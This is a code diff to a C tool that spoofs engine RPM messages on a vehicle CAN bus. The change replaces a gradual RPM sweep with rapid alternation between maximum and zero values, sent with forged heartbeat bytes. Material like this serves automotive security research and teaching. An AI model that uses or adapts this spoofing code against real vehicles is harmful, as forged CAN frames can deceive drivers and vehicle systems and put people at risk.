@@ -176,8 +176,10 @@ void user_change_rpm(Can_socket s){
 
 	signal(SIGINT, stop_sending_can_msges);
 	printf("Press Ctrl+C to stop spoofing and return to main menu.\n");
+	int full_zero_rpm = 0;
 	while(1){
-		for(int i = 0x0000; i < 0x2100; i+=16){
+		full_zero_rpm ^= 0x1;
+		for(int i=0; i<500; i++){
 			if(should_stop_sending_can_msges){
 				should_stop_sending_can_msges = 0;
 				goto return_to_main_menu;
@@ -192,33 +194,13 @@ void user_change_rpm(Can_socket s){
 				heartbeat_bytes[2] = third_hb_byte;
 				heartbeat_bytes[3] = fourth_hb_byte;
 			}
-			rpm_frame.data[1] = (i & 0xFF00) >> 8;
-			rpm_frame.data[2] = i & 0xFF;
-			rpm_frame.data[3] = heartbeat_bytes[heartbeat_index];
-			if (write(s, &rpm_frame, required_mtu) != required_mtu) {
-				perror("write");
+			if(full_zero_rpm == 1){
+				rpm_frame.data[1] = (0x2100 & 0xFF00) >> 8;
+				rpm_frame.data[2] = 0x2100 & 0xFF;
+			} else {
+				rpm_frame.data[1] = (0x0000 & 0xFF00) >> 8;
+				rpm_frame.data[2] = 0x0000 & 0xFF;
 			}
-			usleep(10 * 1000);
-			heartbeat_index++;
-			heartbeat_index %= 4;
-		}
-		for(int i = 0x2100; i >= 0x0000; i-=16){
-			if(should_stop_sending_can_msges){
-				should_stop_sending_can_msges = 0;
-				goto return_to_main_menu;
-			}
-			if(heartbeat_index==0){
-				int first_hb_byte = (rand() % 10) + 0x20;
-				int sec_hb_byte = (rand() % 10) + 0x30;
-				int third_hb_byte = (rand() % 10) + 0x0;
-				int fourth_hb_byte = (rand() % 10) + 0x10;
-				heartbeat_bytes[0] = first_hb_byte;
-				heartbeat_bytes[1] = sec_hb_byte;
-				heartbeat_bytes[2] = third_hb_byte;
-				heartbeat_bytes[3] = fourth_hb_byte;
-			}
-			rpm_frame.data[1] = (i & 0xFF00) >> 8;
-			rpm_frame.data[2] = i & 0xFF;
 			rpm_frame.data[3] = heartbeat_bytes[heartbeat_index];
 			if (write(s, &rpm_frame, required_mtu) != required_mtu) {
 				perror("write");
